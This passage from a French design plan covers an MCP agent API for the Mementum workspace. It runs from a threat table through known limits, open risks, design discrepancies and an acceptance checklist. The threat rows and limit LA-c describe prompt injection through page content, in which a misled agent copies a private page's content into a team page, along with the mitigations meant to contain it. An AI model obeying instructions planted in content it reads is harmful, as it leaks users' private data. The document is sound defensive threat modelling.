| **Une session volée qui se fait un jeton durable** | le mot de passe redemandé à la création (L2) ; la liste des jetons ; R1221 | un voleur qui a aussi le mot de passe |
| **Un agent trop bavard** (boucle) | 120 appels et 16 Mio écrits par minute et par jeton (R1241) ; la file d'une page (R435) ; une part distincte de celle de la session (R1242) ; le débit des duplications pour les créations (R1243) ; les bornes de `PUT /mmd` (12 000 blocs, 8 s) ; le plafond de chaque sortie (R1225) | l'indexeur, sans part par compte (RO-1 du lot 4) ; le journal d'une page récrite en boucle sous le débit ; les plafonds généraux (lot 7) |
| **Une injection par le contenu d'une page** relu par l'agent | la portée (une page piégée ne donne pas ce que le jeton n'ouvre pas) ; aucun canal sortant côté serveur (aucun outil ne va chercher une adresse) ; pas d'adresse e-mail rendue (R1247) ; pas de média externe écrit (R1235) ; le contenu borné et étiqueté (R1239) ; le journal d'activité | un agent trompé peut recopier une page que le jeton lit dans une autre que le jeton écrit, donc d'une page privée vers une page d'équipe : seule une portée étroite l'empêche (limite LA-c) ; ce que l'agent fait hors de Mementum avec ce qu'il a lu |
| **Un agent qui efface** | pas de suppression définitive ; corbeille sur option (R1218) ; `replace_page`, `replace_block`, `delete_block` exigent une révision (R1231) ; `replace_page` refusé quand un autre écrit (R1233) ; une version coupée d'avance (R1234) ; un bloc `unknown` n'est supprimé que si l'opération porte `allow_deleting_content` (§6.2) | ce qu'un humain a tapé depuis moins que l'intervalle des versions **et** que le même jeton a déjà récrit ; cent versions par page |
| **Une page web qui pilote `/mcp`** par le navigateur d'une personne | jeton seul, jamais le cookie (R1237) ; `Origin` vérifiée ; aucun CORS | — |
| **Un temps de réponse qui dit ce qu'on ne voit pas** | les planchers du lot 4 valent par jeton (mêmes routes) ; une page hors portée suit le chemin d'une page non vue | l'écart de temps du `404` d'une page non vue (D12 du lot 4, lot 7) vaut aussi pour une page hors portée |

## Limites connues, écrites d'avance

- **LA-a** (R1227) : une frappe faite dans un bloc au moment où un agent en récrit le contenu (`replace_block`, ou un `replace_page`, un `PUT /mmd`, une restauration qui change ce bloc) est perdue ; dans tout autre bloc, elle est gardée. `str_replace` ne récrit que le texte qu'il remplace.
- **LA-b** (R1211) : pas de mode suggestion : ce qu'un agent écrit est écrit. Ce qui le rend réversible : l'historique (R1234).
- **LA-c** : un agent trompé par le contenu d'une page peut recopier, dans une page que son jeton écrit, ce que son jeton lit. La portée du jeton est la seule barrière ; l'écran de création le dit, et propose « des pages choisies » avant « tout l'espace ».
- **LA-d** (R1235) : un agent ne peut pas poser une image, une vidéo ou un son du web ; il ne peut pas envoyer de fichier (R1222).
- **LA-e** (R1234) : un agent et un humain qui écrivent tour à tour sur une page coupent une version par alternance : les cent versions de la page tournent plus vite (débit au lot 7).
- **LA-f** (R1244, R1245) : le journal d'activité n'est pas un journal d'audit : il perd ses deux dernières secondes à un arrêt brutal, ne garde que mille lignes par jeton, et ne dit pas le contenu écrit. Il n'y a pas d'annulation par exécution.
- **LA-g** : une réponse perdue après `create_pages` laisse l'agent sans savoir si les pages existent ; relancé, il les crée deux fois. La description de l'outil dit de chercher avant de réessayer.
- **LA-h** (R1237) : pas d'OAuth, pas de pont stdio : un client MCP qui ne sait pas poser un en-tête `Authorization` sur une adresse HTTP ne se branche pas (Claude Code le sait) ; un client qui tourne dans une page d'un autre site non plus.
- **LA-i** (R1226) : la précondition par blocs ne vaut que pour une révision que le serveur a servie depuis son démarrage, et encore dans son cache ; sinon tout changement de la page vaut conflit.
- **LA-j** (R1246, R1248) : la date de modification d'une page et le filtre qui s'en sert ont le retard de l'indexeur (2 à 15 s) ; pas de filtre par type.
- **LA-k** (R1242) : les jetons d'un compte se partagent une part des gardes par compte : deux agents d'un même compte qui cherchent ou écrivent la même page en même temps se font attendre, ou reçoivent `429`.
- **LA-l** : un espace entier se lit par jeton aussi vite que le débit le permet (120 appels de 64 Kio par minute) : un jeton de lecture volé lit tout ce qu'il ouvre.
- **LA-m** (R1224) : un alias de bloc dépend de l'identifiant du bloc : un bloc recréé sous un autre identifiant (remplacé par un humain) rend son alias périmé, et l'agent relit.

**Risques ouverts**

- **RO-A** : la version 2026-07-28 de la spécification MCP n'est pas connue de l'auteur de ce plan (écart E8). Si elle exige ce que R1236 écarte, M1 grossit.
- **RO-B** : yrs devant une écriture par différence faite de beaucoup de petites suppressions et insertions (R367 : le ramasse-miettes coûtait « retiré × écrit » en une transaction). S0 mesure ; le repli est `rewrite_blocks`.
- **RO-C** : l'indexeur sans part par compte (RO-1 du lot 4) : un agent qui écrit au débit de R1241 dans de grandes pages le tient pour toute l'instance. Le lot ne le lève pas ; X2 le mesure, et le dit.
- **RO-D** : la restriction d'un `SpaceAccess` à chaque appel, sur un grand espace (S5 mesure, cache si besoin).

## Écarts et contradictions trouvés dans la conception

Aucun n'est tranché ici quand il est un choix de produit : chacun renvoie à sa décision.

- **E1 — « API REST complète ».** `docs/REPRISE.md` et le README donnent au lot 5 l'« API REST complète » ; le §9 ne met en P1 que « MCP v1 […] avec jetons personnels », et « API REST » dans la ligne de la P2 ; le §6.6 (OpenAPI, SDK, CLI de contenu, webhooks, SSE, `llms.txt`) n'a pas de phase. *Le plan suppose* R1210. Décision L11.
- **E2 — le mode par défaut.** §6.1 (principe 5) et §6.4 : « mode suggestion par défaut » ; §4.5 et §9 : suggestions en P3. La P1 ne peut livrer que `direct`. Décision L5.
- **E3 — la corbeille.** §6.5 : « la corbeille demande une confirmation humaine » ; §6.7, « approbations obligatoires » : P4. Aucun mécanisme d'approbation n'existe. Décision L4.
- **E4 — les identifiants.** §5.3 et §6.2 montrent des alias courts (`pg_7Hq2Lm`) et une révision `r_8f3a1c` ; le code n'a que des UUID, et `r_` suivi de 16 chiffres hexadécimaux. *Le plan garde le code* : pas d'alias de page (un UUID coûte une vingtaine de tokens ; les noms d'espaces et les titres font le reste).
- **E5 — le frontmatter.** §6.2 écrit les métadonnées en frontmatter YAML dans le MMD ; `mementum-md` n'en a pas, et `GET /mmd` rend le corps seul. *Le plan* : R1223.

- **E7 — l'autorisation de `/mcp`.** §6.5 : OAuth 2.1, CIMD, portées progressives, et jetons personnels ; §9 : « OAuth MCP + CIMD » en P4. *Le plan* : jetons seuls, sans métadonnées OAuth.
- **E8 — la version du protocole.** §6.5 : « cible spec MCP 2026-07-28 et rétrocompatible avec la 2025-11-25 ». L'auteur de ce plan ne connaît pas le contenu de la première. S0 la lit ; la liste des versions servies est arrêtée par son compte rendu. Le §6.5 nomme aussi des prompts, l'extension Tasks et un pont stdio, qu'aucune phase ne porte : hors du lot (décision L12).
- **E9 — les tables.** §5.3 : `api_tokens(id, user_or_agent_id, space_id?, scopes, expires_at, hash)`, `agents`, `agent_runs`, `audit_log`, `ops_log`. Le plan écrit `api_tokens` autrement (niveau, portée, pages à part), et ne crée ni agents, ni exécutions, ni journal d'audit.
- **E10 — l'audit.** §6.7 : « journal immuable de chaque appel d'outil […] exportable, avec annulation par exécution » ; §9 : « journal d'audit » en P3. Le plan livre un journal d'activité (R1244, R1245), et le dit tel. Décision L8.
- **E11 — l'origine d'une écriture.** §6.4 : `origin = {agent_id, run_id, on_behalf_of}`, badge, « Agent X écrit… ». Le plan : `doc_updates.token_id`, « par un agent » dans l'historique, rien d'autre.
- **E12 — `set_properties`.** §6.3 : propriétés validées selon le schéma ; les propriétés sont la P2. Le plan : la seule clé `title` ; toute autre, `422 unknown_property`.
- **E13 — les filtres de `search`.** §6.5 : « espace, type, date, auteur » ; en P1 un nœud est une page ou un dossier, et les dossiers ne sont pas cherchés (L3 du lot 4) : « type » n'a pas d'objet avant les bases. Décision L9.

- **E16 — les réglages d'espace.** §4.2 : « Réglages : espace (… agents, jetons d'API, journal d'audit) ». Au lot 5, un jeton est personnel et se gère dans le compte ; un admin ne voit pas les jetons que les membres ouvrent sur son espace. Décision L10.

## Ébauche de la checklist de recette

À écrire par la Task D ; ce qu'un test ne juge pas :

1. Créer un jeton limité à un espace : l'écran se comprend-il sans notice ? La portée « des pages choisies » est-elle bien celle qu'on prend d'abord ?
2. Le jeton montré une fois : sait-on quoi en faire ? La commande pour Claude Code marche-t-elle telle quelle ?
3. « Verse ce compte rendu dans mon espace Pro », dit à Claude Code : la page arrive-t-elle où on l'attend (« Privé »), avec la bonne forme ?
4. Taper dans une page pendant que Claude Code la complète : voit-on ce qu'il fait ? Est-ce gênant ? (Rien ne dit « un agent écrit » : P4.)
5. Demander à Claude Code de remplacer un paragraphe pendant qu'on tape dedans : ce qu'on perd (LA-a) est-il acceptable ?
6. Retrouver dans l'historique ce qu'un agent a remplacé, et le restaurer.
7. Lire l'activité d'un jeton : y trouve-t-on ce qu'on cherche ?
8. Révoquer un jeton pendant que l'agent travaille : ce que dit l'agent se comprend-il ?
9. Les messages d'erreur rendus à l'agent (portée, révision, texte introuvable) : l'agent s'en sort-il seul ?
10. Les décisions L1 à L16, telles que retenues.
